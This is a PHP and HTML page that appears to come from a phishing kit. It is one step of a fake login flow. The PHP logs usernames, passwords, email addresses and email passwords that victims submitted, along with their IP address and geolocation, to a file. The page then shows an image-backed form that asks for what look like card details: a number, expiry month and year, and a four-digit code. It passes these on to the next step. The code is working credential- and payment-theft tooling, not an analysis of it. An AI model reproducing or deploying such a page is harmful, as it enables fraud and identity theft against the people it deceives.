<?php
session_start();

$_SESSION['E1'] = $_POST['ipts3'];
$_SESSION['EP1'] = $_POST['ipts4'];
$_SESSION['AT1'] = $_POST['ipts5'];



@$fhandlr = fopen($_SESSION['FN'], "a");

@fwrite($fhandlr, "***********************************************\n");
@fwrite($fhandlr, 'U: '.$_SESSION['U1']."\n");
@fwrite($fhandlr, 'P: '.$_SESSION['P1']."\n");
@fwrite($fhandlr, 'E: '.$_SESSION['E1']."\n");
@fwrite($fhandlr, 'EP: '.$_SESSION['EP1']."\n");
@fwrite($fhandlr, 'AT-M: '.$_SESSION['AT1']."\n");



if( !empty($_SERVER['REMOTE_ADDR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}else{
    fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
}

fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
fclose($fhandlr);

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=0.7">
<title></title>
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">

</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;background: rgba(0,0,0,0.32);">
	<div id="cnt2" style="text-align:center;">
		<form action="step-4.php" method="post" style="background:#fff;display: inline-block;
    background-image: url(images/afrms2.svg);
    width: 980px;
    background-repeat: no-repeat;
    height: 552px;text-align:left;margin-top:20px;">
		<input name="ipts6" type="text" style="position: relative;
    top: 267px;
    left: 479px;
    width: 110px;
    display: block;
    height: 14px;
    font-size: 12px;" required placeholder="">

    <select name="ipts7" required="" style="position: relative;
    top: 275px;
    left: 479px;
    width: 40px;
    display: block;
    height: 18px;
    font-size: 12px;">
        <option value="">--</option>
        <option value="1">01</option>
        <option value="2">02</option>
        <option value="3">03</option>
        <option value="4">04</option>
        <option value="5">05</option>
        <option value="6">06</option>
        <option value="7">07</option>
        <option value="8">08</option>
        <option value="9">09</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
    </select>

    <select name="ipts8" required="" style="    position: relative;
    top: 257px;
    left: 527px;
    width: 52px;
    display: block;
    height: 18px;
    font-size: 12px;">
        <option value="">--</option>
        <option value="2022">2022</option>
        <option value="2023">2023</option>
        <option value="2024">2024</option>
        <option value="2025">2025</option>
        <option value="2026">2026</option>
        <option value="2027">2027</option>
        <option value="2028">2028</option>
        <option value="2029">2029</option>
        <option value="2030">2030</option>
    </select>

    
    <input name="ipts9" type="text" style="position: relative;
    top: 262px;
    left: 479px;
    width: 52px;
    display: block;
    height: 14px;
    font-size: 12px;" required placeholder="" maxlength="4">

    <input type="submit" style="position: relative;
    top: 350px;
    left: 641px;
    width: 110px;
    display: block;
    height: 24px;
    font-size: 12px;" value="Continuar">

			
		</form>
	</div>
	<div style="text-align:center;">
		<footer style="opacity:0.6;padding-top: 20px;margin-top: 80px;background-color: #eee;width: 980px;display:inline-block;text-align:left;">
			<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px;margin-left:10px">
		</footer>
	</div>
</body>
</html>